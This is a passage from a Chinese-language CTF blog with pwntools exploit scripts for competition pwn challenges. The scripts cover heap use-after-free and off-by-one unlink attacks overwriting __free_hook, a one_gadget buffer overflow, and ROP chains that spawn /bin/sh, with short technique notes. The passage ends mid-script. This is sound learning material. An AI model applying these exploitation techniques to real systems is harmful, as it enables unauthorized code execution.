<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./daily&#x27;)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span><br><span class="line">def show():</span><br><span class="line">    p.recvuntil(&#x27;choice:&#x27;)</span><br><span class="line">    p.sendline(&#x27;1&#x27;)</span><br><span class="line">    raw = p.recvuntil(&#x27;===&#x27;)[:-4]</span><br><span class="line">    return raw</span><br><span class="line"></span><br><span class="line">def add(length , content):</span><br><span class="line">    p.recvuntil(&#x27;choice:&#x27;)</span><br><span class="line">    p.sendline(&#x27;2&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;daily:&#x27;)</span><br><span class="line">    p.sendline(str(length))</span><br><span class="line">    p.recvuntil(&#x27;daily\n&#x27;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def change(index , content):</span><br><span class="line">    p.recvuntil(&#x27;choice:&#x27;)</span><br><span class="line">    p.sendline(&#x27;3&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;daily:&#x27;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(&#x27;daily\n&#x27;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def remove(index):</span><br><span class="line">    p.recvuntil(&#x27;choice:&#x27;)</span><br><span class="line">    p.sendline(&#x27;4&#x27;)</span><br><span class="line">    p.recvuntil(&#x27;daily:&#x27;)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">for i in range(5):</span><br><span class="line">    add(0x80 , &#x27;\x00&#x27; * 0x5f)</span><br><span class="line">remove(1)</span><br><span class="line">remove(3)</span><br><span class="line">add(0x80 , &#x27;&#x27;)</span><br><span class="line">libc.address = u64(show().split(&#x27;1 : &#x27;)[1][:6].ljust(8 , &#x27;\x00&#x27;)) - 0x3c4b0a</span><br><span class="line">change(1 , &#x27;abcdefgh&#x27;)</span><br><span class="line">heap_base = u64(show().split(&#x27;abcdefgh&#x27;)[1].split(&#x27;2 :&#x27;)[0].ljust(8 , &#x27;\x00&#x27;)) - 0x10a</span><br><span class="line">free_hook = libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">system_addr = libc.symbols[&#x27;system&#x27;]</span><br><span class="line">success(&#x27;libc_base =&gt; &#x27; + hex(libc.address))</span><br><span class="line">success(&#x27;heap_base =&gt; &#x27; + hex(heap_base))</span><br><span class="line">success(&#x27;free_hook =&gt; &#x27; + hex(free_hook))</span><br><span class="line">success(&#x27;system_addr =&gt; &#x27; + hex(system_addr))</span><br><span class="line">remove(4)</span><br><span class="line">remove(2)</span><br><span class="line">remove(1)</span><br><span class="line">remove(0)</span><br><span class="line">add(0x30 , &#x27;a&#x27; * 8 + p64(heap_base + 0x10))</span><br><span class="line">offset = (heap_base - 0x602060) / 16 + 1</span><br><span class="line">remove(offset)</span><br><span class="line">add(0x41 , &#x27;\x00&#x27; * 0x40)       //big problem</span><br><span class="line">change(0 , p64(0x602068))</span><br><span class="line">add(0x30 , &#x27;/bin/sh\x00&#x27;)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(0x30 , p64(free_hook))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">change(1 , p64(system_addr))</span><br><span class="line">remove(0)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>we can have a disguised UAF .By the way,<code>big problem</code> first i think it’s nothing(means i can delete it),but in the fact ,it means it is a chunk(hahah)</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/10/11/2019-10-11-1st_week/" data-id="cuidvD7CDl-Uv5iTb1dcsX6z9" data-title="first week" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2019-10-14-2nd_week" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/11/2019-10-14-2nd_week/" class="article-date">
  <time class="dt-published" datetime="2019-10-10T16:00:00.000Z" itemprop="datePublished">2019-10-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/10/11/2019-10-14-2nd_week/">second week</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <blockquote>
<p>10.14 ~ 10.20</p>
</blockquote>
<p>这是今年信息安全竞赛华南赛区半决赛的 pwn 题, wp 基本来自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5517">大佬</a></p>
<h1 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h1><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><blockquote>
<p>off by one</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;, checksec=False)</span><br><span class="line">def new(ind,size,content):</span><br><span class="line">	p.sendlineafter(&#x27;4.show\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;index:\n&#x27;,str(ind))</span><br><span class="line">	p.sendlineafter(&#x27;size:\n&#x27;,str(size))</span><br><span class="line">	p.sendafter(&#x27;content:\n&#x27;,content)</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;4.show\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendafter(&#x27;index:\n&#x27;,str(ind))</span><br><span class="line">def edit(ind,content):</span><br><span class="line">	p.sendlineafter(&#x27;4.show\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;index:\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;content:\n&#x27;,content)</span><br><span class="line">new(2,0xf8,&quot;/bin/sh&quot;)</span><br><span class="line">new(32,0xf8,&quot;32&quot;)</span><br><span class="line">new(31,0xf8,&quot;31&quot;)</span><br><span class="line">new(30,0xf8,&quot;30&quot;)</span><br><span class="line">pay = p64(0)+p64(0xf1)+p64(0x6021c8)+p64(0x6021c8+8)</span><br><span class="line">pay = pay.ljust(0xf0)</span><br><span class="line">pay += p64(0xf0)</span><br><span class="line">edit(32,pay)</span><br><span class="line">free(31)</span><br><span class="line">pay = p64(0x6021c8)*3 +  p64(elf.got[&#x27;free&#x27;])</span><br><span class="line">pay = pay.ljust(0xf0)</span><br><span class="line">pay += p64(1)</span><br><span class="line">edit(32,pay)</span><br><span class="line">p.sendline(&quot;4&quot;)</span><br><span class="line">p.recvuntil(&quot;index:&quot;)</span><br><span class="line">p.send(&quot;32&quot;)</span><br><span class="line">p.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_base = leak - libc.symbols[&#x27;free&#x27;]</span><br><span class="line">system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line">free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line">pay = &#x27;a&#x27;*0x18 +  p64(free_hook)</span><br><span class="line">pay = pay.ljust(0xf0,&#x27;a&#x27;)</span><br><span class="line">pay += p64(1)</span><br><span class="line">edit(30,pay)</span><br><span class="line">edit(32,p64(system))</span><br><span class="line">free(2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>在这里记录一下貌似我看到的<code>off by one</code>都是使用 unlink 的方法,而且感觉总结出来一个算是心得的东西,就是有 PIE 的反而都是简单的,而不开的反而需要我们去认真分析每个堆的数据结构,通过了解这个来攻破</p>
<p>这里要详细记录一下,毕竟整出来了,23333</p>
<p>这里卡了一点,师傅直接用 free 整的 libc 偏移,今天我用个别的方法(看看行不行),还是感觉不是预期解,主要是没用到 leak</p>
<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><blockquote>
<p>buffer overflow</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p = remote(&quot;172.29.3.115&quot;,&quot;9999&quot;)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line">payload = &#x27;a&#x27;*0x28</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*0x28)</span><br><span class="line">p.recv(8)</span><br><span class="line">leak = u32(p.recv(4))</span><br><span class="line">success(hex(leak))</span><br><span class="line">libc_base = leak - 0x1b23dc</span><br><span class="line">libc.address = libc_base</span><br><span class="line">one = libc_base + 0x3ac69</span><br><span class="line">print p.recv()</span><br><span class="line">payload = &#x27;a&#x27;*0x28 + &#x27;bbbb&#x27; + p32(one)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这个很简单,我一开始想构造 rop 链,结果一看师傅直接 one_gadegt 妙出,秒啊,直接泄漏 libc.address 还行,这个记录一下,实在太秒了</p>
<h2 id="pwn8"><a href="#pwn8" class="headerlink" title="pwn8"></a>pwn8</h2><blockquote>
<p>逆向题???</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">#io = process(&quot;./easy_pwn&quot;)</span><br><span class="line">io = remote(&quot;172.29.3.119&quot;,&quot;9999&quot;)</span><br><span class="line">elf = ELF(&quot;./easy_pwn&quot;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">from struct import pack</span><br><span class="line"># Padding goes here</span><br><span class="line">p = &#x27;&#x27;</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; ret</span><br><span class="line">p += &#x27;/bin//sh&#x27;</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004006e6) # pop rdi ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000449bf5) # pop rdx ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax; ret</span><br><span class="line">p += p64(59) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x000000000040139c) # syscall</span><br><span class="line"></span><br><span class="line">strings = &quot;&quot;</span><br><span class="line">for i in p :</span><br><span class="line">    strings += chr(ord(i)^0x66)</span><br><span class="line"></span><br><span class="line">pay = &#x27;a&#x27;*0x50 + strings</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(pay)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>做这个的时候我只看到了栈溢出,然后觉得输入密码什么是个逆向题,后来发现直接 ropchain 直接完事.注意一下,在<code>ROPgadget --binary pwn --ropchain</code>时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br></pre></td></tr></table></figure>

<p>它直接<code>add rax, 1 ; ret</code>,硬生生抬了 59 ,主要是 ropchain 是只用地址完成的 getshell ,所以还是甩<code> ROPgadget --binary easy_pwn --only &quot;pop|ret&quot; | grep rax</code>比较简单,可以<code>pop rax; ret</code>后接一个 59 ,节省了 (59-2)*8 个字节</p>
<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><blockquote>
<p>rop 构造,思路感人</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">#!/upr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">def piedebug(addr):</span><br><span class="line">    text_base = int(os.popen(&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;.format(p.pid)).readlines()[1],16)</span><br><span class="line">    log.info(&quot;elf_base:&#123;&#125;&quot;.format(hex(text_base)))</span><br><span class="line">    log.info(&quot;fake_heap:&#123;&#125;&quot;.format(hex(text_base + 0x202018)))</span><br><span class="line">    #log.info(&quot;get_array:&#123;&#125;&quot;.format(hex(text_base + 0x202140)))</span><br><span class="line">    if addr!=0:</span><br><span class="line">        gdb.attach(p,&#x27;b *&#123;&#125;&#x27;.format(hex(text_base+addr)))</span><br><span class="line">    else:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">#-------------------------------------</span><br><span class="line">def sl(s):</span><br><span class="line">    return p.sendline(s)</span><br><span class="line">def sd(s):</span><br><span class="line">    return p.send(s)</span><br><span class="line">def rc(timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recv()</span><br><span class="line">    else:</span><br><span class="line">        return p.recv(timeout=timeout)</span><br><span class="line">def ru(s, timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recvuntil(s)</span><br><span class="line">    else:</span><br><span class="line">        return p.recvuntil(s, timeout=timeout)</span><br><span class="line">def sla(p,a,s):</span><br><span class="line">    return p.sendlineafter(a,s)</span><br><span class="line">def sda(a,s):</span><br><span class="line">    return p.sendafter(a,s)</span><br><span class="line">def debug(addr=&#x27;&#x27;):</span><br><span class="line">    gdb.attach(p,addr)</span><br><span class="line">    pause()</span><br><span class="line">def getshell():</span><br><span class="line">    p.interactive()</span><br><span class="line">def msg(msg,addr):</span><br><span class="line">    log.warn(msg+&quot;-&gt;&quot;+hex(addr))</span><br><span class="line">#-------------------------------------</span><br><span class="line">def exp():</span><br><span class="line">    aaa=asm(shellcraft.sh())</span><br><span class="line">    pop_rdi_ret=0x00000000004005a3</span><br><span class="line">    pop_rsi_r15=0x00000000004005a1</span><br><span class="line">    pop_r14_r15=0x00000000004005a0</span><br><span class="line">    mov_eax_exe_ret=0x00000000004004e3 </span><br><span class="line">    pop_r12_r13_r14_r15=0x000000000040059c</span><br><span class="line">    pop_rbx_rbp_r12_r13_r14_r15=0x40059A</span><br><span class="line">    mov_rdx_r13_rsi_r14_edi_r15_call=0x400580</span><br><span class="line">    #call r12+rbx*8</span><br><span class="line"></span><br><span class="line">    ret=0x004003a9</span><br><span class="line">    main  = 0x4004ED</span><br><span class="line">    syscall_ret=0x0000000000400517</span><br><span class="line">    g = 0x4004da</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay = &quot;a&quot;*16+p64(main)</span><br><span class="line">    sd(pay)</span><br><span class="line">    #print p.recv()</span><br><span class="line">    stack = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">    msg(&quot;stack&quot;,stack)</span><br><span class="line">    stack=stack-0x118</span><br><span class="line">    msg(&quot;stack&quot;,stack)</span><br><span class="line"></span><br><span class="line">    pay = &quot;/bin//sh\x00&quot;.ljust(0x10,&quot;\x00&quot;)</span><br><span class="line"></span><br><span class="line">    pay+=p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(10)+p64(0)+p64(stack)+p64(0)+p64(0)*2</span><br><span class="line">    pay+=p64(mov_rdx_r13_rsi_r14_edi_r15_call)</span><br><span class="line"></span><br><span class="line">    pay+=p64(mov_eax_exe_ret)</span><br><span class="line">    pay+=p64(pop_rdi_ret)+p64(stack)</span><br><span class="line">    pay+=p64(pop_rsi_r15)+p64(0)*2</span><br><span class="line">    pay+=p64(syscall_ret)</span><br><span class="line">    sd(pay)</span><br><span class="line">    getshell()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bin_elf = &quot;./pwn&quot;</span><br><span class="line">    elf = ELF(bin_elf)</span><br><span class="line">    context.binary=bin_elf</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">    if sys.argv[1] == &quot;r&quot;:</span><br><span class="line">        p = remote(&quot;172.29.3.114&quot;,9999)</span><br><span class="line">        libc = elf.libc</span><br><span class="line">    elif sys.argv[1] == &quot;l&quot;:</span><br><span class="line">        libc = elf.libc</span><br><span class="line">        p = process(bin_elf)</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>这道题我想的也是直接去布置 rop ,但是不知道栈地址,还好还好,这个 write 和 read 函数都能避免 <code>\x00</code> 截断问题,我们能根据 write 带出来一个特定偏移的地址,之后就是常规的布置 rop 了</p>
<p>但是,这里学到了,我之前一直以为去 <code>call   QWORD PTR [r12+rbx*8]</code> 之后的布置还需要在构造一下,因为我之前看到的都是把 rbx 步成 0 ,这个我没想到可以去直接用 rbx 去控制程序走向, orz</p>
<h2 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h2><blockquote>
<p>UAF ( tcache )</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">#!/upr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">def piedebug(addr):</span><br><span class="line">    text_base = int(os.popen(&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;.format(p.pid)).readlines()[1],16)</span><br><span class="line">    log.info(&quot;elf_base:&#123;&#125;&quot;.format(hex(text_base)))</span><br><span class="line">    log.info(&quot;fake_heap:&#123;&#125;&quot;.format(hex(text_base + 0x202018)))</span><br><span class="line">    #log.info(&quot;get_array:&#123;&#125;&quot;.format(hex(text_base + 0x202140)))</span><br><span class="line">    if addr!=0:</span><br><span class="line">        gdb.attach(p,&#x27;b *&#123;&#125;&#x27;.format(hex(text_base+addr)))</span><br><span class="line">    else:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">#-------------------------------------</span><br><span class="line">def sl(s):</span><br><span class="line">    return p.sendline(s)</span><br><span class="line">def sd(s):</span><br><span class="line">    return p.send(s)</span><br><span class="line">def rc(timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recv()</span><br><span class="line">    else:</span><br><span class="line">        return p.recv(timeout=timeout)</span><br><span class="line">def ru(s, timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recvuntil(s)</span><br><span class="line">    else:</span><br><span class="line">        return p.recvuntil(s, timeout=timeout)</span><br><span class="line">def sla(p,a,s):</span><br><span class="line">    return p.sendlineafter(a,s)</span><br><span class="line">def sda(a,s):</span><br><span class="line">    return p.sendafter(a,s)</span><br><span class="line">def debug(addr=&#x27;&#x27;):</span><br><span class="line">    gdb.attach(p,addr)</span><br><span class="line">    pause()</span><br><span class="line">def getshell():</span><br><span class="line">    p.interactive()</span><br><span class="line">def 